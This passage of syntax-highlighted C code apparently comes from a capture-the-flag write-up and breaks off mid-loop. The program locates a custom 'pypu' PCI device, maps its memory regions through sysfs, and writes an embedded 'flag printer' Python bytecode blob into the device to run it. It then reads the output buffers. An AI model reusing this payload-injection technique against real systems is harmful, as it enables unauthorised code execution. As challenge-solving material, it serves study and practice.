73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
</pre><td class="rouge-code"><pre><span class="cp">#define _GNU_SOURCE
#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;dirent.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp">
</span>
<span class="cp">#define CODE_BUF_SIZE    2048
#define STDOUT_BUF_SIZE  0x1000
#define STDERR_BUF_SIZE  0x1000
</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">flag_printer_pyc</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
  <span class="mh">0xf3</span><span class="p">,</span> <span class="mh">0x0d</span><span class="p">,</span> <span class="mh">0x0d</span><span class="p">,</span> <span class="mh">0x0a</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xd3</span><span class="p">,</span> <span class="mh">0x9d</span><span class="p">,</span> <span class="mh">0xbc</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span>
  <span class="mh">0x1a</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0xa0</span><span class="p">,</span> <span class="mh">0xf0</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
  <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
  <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xf3</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span>
  <span class="mh">0x4b</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x5c</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span>
  <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
  <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
  <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x02</span><span class="p">,</span> <span class="mh">0xe9</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span>
  <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0xda</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0xda</span><span class="p">,</span>
  <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0xda</span><span class="p">,</span> <span class="mh">0x04</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x67</span><span class="p">,</span>
  <span class="mh">0xa9</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xf3</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xda</span><span class="p">,</span> <span class="mh">0x06</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span>
  <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0x3e</span><span class="p">,</span> <span class="mh">0xda</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x6d</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x64</span><span class="p">,</span> <span class="mh">0x75</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span>
  <span class="mh">0x3e</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x09</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x73</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span>
  <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xf0</span><span class="p">,</span> <span class="mh">0x03</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x0c</span><span class="p">,</span> <span class="mh">0xd9</span><span class="p">,</span>
  <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x05</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0xd5</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span>
  <span class="mh">0x07</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">,</span> <span class="mh">0x00</span>
<span class="p">};</span>
<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">flag_printer_pyc_len</span> <span class="o">=</span> <span class="mi">184</span><span class="p">;</span>

<span class="k">static</span> <span class="kt">int</span> <span class="nf">read_hex_file</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span><span class="n">out</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">FILE</span> <span class="o">*</span><span class="n">f</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s">"r"</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">f</span><span class="p">)</span> <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">fscanf</span><span class="p">(</span><span class="n">f</span><span class="p">,</span> <span class="s">"0x%x"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">v</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fclose</span><span class="p">(</span><span class="n">f</span><span class="p">);</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">fclose</span><span class="p">(</span><span class="n">f</span><span class="p">);</span>
    <span class="o">*</span><span class="n">out</span> <span class="o">=</span> <span class="n">v</span><span class="p">;</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">static</span> <span class="kt">int</span> <span class="nf">find_pypu_device</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">out</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">outsz</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">base</span> <span class="o">=</span> <span class="s">"/sys/bus/pci/devices"</span><span class="p">;</span>
    <span class="kt">DIR</span> <span class="o">*</span><span class="n">dir</span> <span class="o">=</span> <span class="n">opendir</span><span class="p">(</span><span class="n">base</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">dir</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"opendir pci devices"</span><span class="p">);</span>
        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">struct</span> <span class="n">dirent</span> <span class="o">*</span><span class="n">de</span><span class="p">;</span>
    <span class="k">while</span> <span class="p">((</span><span class="n">de</span> <span class="o">=</span> <span class="n">readdir</span><span class="p">(</span><span class="n">dir</span><span class="p">))</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">de</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">,</span> <span class="s">"."</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">de</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">,</span> <span class="s">".."</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
            <span class="k">continue</span><span class="p">;</span>

        <span class="kt">char</span> <span class="n">path</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
        <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">vendor</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span> <span class="n">device</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

        <span class="n">snprintf</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">path</span><span class="p">),</span> <span class="s">"%s/%s/vendor"</span><span class="p">,</span> <span class="n">base</span><span class="p">,</span> <span class="n">de</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">read_hex_file</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">vendor</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
            <span class="k">continue</span><span class="p">;</span>

        <span class="n">snprintf</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">path</span><span class="p">),</span> <span class="s">"%s/%s/device"</span><span class="p">,</span> <span class="n">base</span><span class="p">,</span> <span class="n">de</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">read_hex_file</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">device</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
            <span class="k">continue</span><span class="p">;</span>

        <span class="k">if</span> <span class="p">(</span><span class="n">vendor</span> <span class="o">==</span> <span class="mh">0x1337</span> <span class="o">&amp;&amp;</span> <span class="n">device</span> <span class="o">==</span> <span class="mh">0x1225</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">snprintf</span><span class="p">(</span><span class="n">out</span><span class="p">,</span> <span class="n">outsz</span><span class="p">,</span> <span class="s">"%s/%s"</span><span class="p">,</span> <span class="n">base</span><span class="p">,</span> <span class="n">de</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">);</span>
            <span class="n">closedir</span><span class="p">(</span><span class="n">dir</span><span class="p">);</span>
            <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>

    <span class="n">closedir</span><span class="p">(</span><span class="n">dir</span><span class="p">);</span>
    <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
<span class="p">}</span>

<span class="cp">#define REG32(base, off) (*(volatile uint32_t *)((uint8_t*)(base) + (off)))
#define REG8(base, off)  (*(volatile uint8_t  *)((uint8_t*)(base) + (off)))
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
<span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">flag_printer_pyc_len</span> <span class="o">&gt;</span> <span class="n">CODE_BUF_SIZE</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[-] pyc too big: %u &gt; %u</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span>
                <span class="n">flag_printer_pyc_len</span><span class="p">,</span> <span class="n">CODE_BUF_SIZE</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kt">char</span> <span class="n">devdir</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">find_pypu_device</span><span class="p">(</span><span class="n">devdir</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">devdir</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[-] cannot find pypu device (0x1337:0x1225)</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[*] pypu device: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">devdir</span><span class="p">);</span>

    <span class="kt">char</span> <span class="n">bar0_path</span><span class="p">[</span><span class="mi">512</span><span class="p">],</span> <span class="n">bar1_path</span><span class="p">[</span><span class="mi">512</span><span class="p">],</span> <span class="n">bar2_path</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span>
    <span class="n">snprintf</span><span class="p">(</span><span class="n">bar0_path</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">bar0_path</span><span class="p">),</span> <span class="s">"%s/resource0"</span><span class="p">,</span> <span class="n">devdir</span><span class="p">);</span>
    <span class="n">snprintf</span><span class="p">(</span><span class="n">bar1_path</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">bar1_path</span><span class="p">),</span> <span class="s">"%s/resource1"</span><span class="p">,</span> <span class="n">devdir</span><span class="p">);</span>
    <span class="n">snprintf</span><span class="p">(</span><span class="n">bar2_path</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">bar2_path</span><span class="p">),</span> <span class="s">"%s/resource2"</span><span class="p">,</span> <span class="n">devdir</span><span class="p">);</span>

    <span class="kt">int</span> <span class="n">fd0</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">bar0_path</span><span class="p">,</span> <span class="n">O_RDWR</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">fd0</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"open resource0"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="kt">int</span> <span class="n">fd1</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">bar1_path</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">fd1</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"open resource1"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="kt">int</span> <span class="n">fd2</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">bar2_path</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">fd2</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"open resource2"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kt">void</span> <span class="o">*</span><span class="n">bar0</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="n">fd0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">bar0</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"mmap bar0"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="kt">void</span> <span class="o">*</span><span class="n">bar1</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">STDOUT_BUF_SIZE</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="p">,</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="n">fd1</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">bar1</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"mmap bar1"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="kt">void</span> <span class="o">*</span><span class="n">bar2</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="n">STDERR_BUF_SIZE</span><span class="p">,</span> <span class="n">PROT_READ</span><span class="p">,</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="n">fd2</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">bar2</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">perror</span><span class="p">(</span><span class="s">"mmap bar2"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="kt">uint32_t</span> <span class="n">sig</span> <span class="o">=</span> <span class="n">REG32</span><span class="p">(</span><span class="n">bar0</span><span class="p">,</span> <span class="mh">0x00</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[*] BAR0 signature = 0x%08x (expect 0x50595055)</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">sig</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">sig</span> <span class="o">!=</span> <span class="mh">0x50595055</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[-] signature mismatch, not PYPU</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[*] mapped BAR0=%p BAR1=%p BAR2=%p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">bar0</span><span class="p">,</span> <span class="n">bar1</span><span class="p">,</span> <span class="n">bar2</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[*] pyc length = %u</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">flag_printer_pyc_len</span><span class="p">);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[*] pyc header first 16 bytes:</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">16</span> <span class="o">&amp;&amp;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">flag_printer_pyc_len</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"%02x "</span><span class="p">,</span> <span class="n">flag_printer_pyc</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
    <span class="p">}</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

    <span class="kt">uint32_t</span> <span class="n">greet_before</span> <span class="o">=</span> <span class="n">REG32</span><span class="p">(</span><span class="n">bar0</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[*] greet_count before = %u</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">greet_before</span><span class="p">);</span>

    <span class="n">REG32</span><span class="p">(</span><span class="n">bar0</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">)</span> <span class="o">=</span> <span class="p">(</span><span class="kt">uint32_t</span><span class="p">)</span><span class="n">flag_printer_pyc_len</span><span class="p">;</span>

    <span class="k">for</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">flag_printer_pyc_len</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">REG8</span><span class="p">(</span><span class="n">bar0</span><span class="p">,</span> <span class="mh">0x100</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">=</span> <span class="n">flag_printer_pyc</span><span class="p">[</span><span class="n">i</span><span class="p">];</span>
    <span class="p">}</span>

    <span class="n">REG32</span><span class="p">(</span><span class="n">bar0</span><span class="p">,</span> <span class="mh">0x0c</span><span class="p">)</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>

    <span class="kt">uint32_t</span> <span class="n">greet_after</span> <span class="o">=</span> <span class="n">REG32</span><span class="p">(</span><span class="n">bar0</span><span class="p">,</span> <span class="mh">0x08</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[*] greet_count after = %u</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">greet_after</span><span class="p">);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[*] stdout buffer:</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">printed_out</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">STDOUT_BUF_SIZE</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="kt">char</span> <span class="n">c</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="n">REG8</span><span class="p">(</span><span class="n">bar1</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">c</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
        <span class="n">putchar</span><span class="p">(</span><span class="n">c</span><span class="p">);</span>
        <span class="n">printed_out</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">printed_out</span><span class="p">)</span>
        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"[!] stdout empty</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"</span><span class="se">\n</span><span class="s">[*] stderr buffer:</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="kt">int</span> <span class="n">printed_err</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">STDERR_BUF_SIZE</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="kt">char</span> <span class="n">c</span> <span class="o">=</span> <span class="p">(</span><span class="kt">char</span><span class="p">)</span><span class="n">REG8</span><span class="p">(</span><span class="n">bar2</span><span class="p">,</span> <span class="n">i</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">c</span><span class="p">)</span> <span class="k">break</span><span class="p">;</span>
        <span class="n">fputc</span><span class="p">(</span><span class="n">c</span><span class="p">,</span> <span class="n">stderr</span><span class="p">);</span>
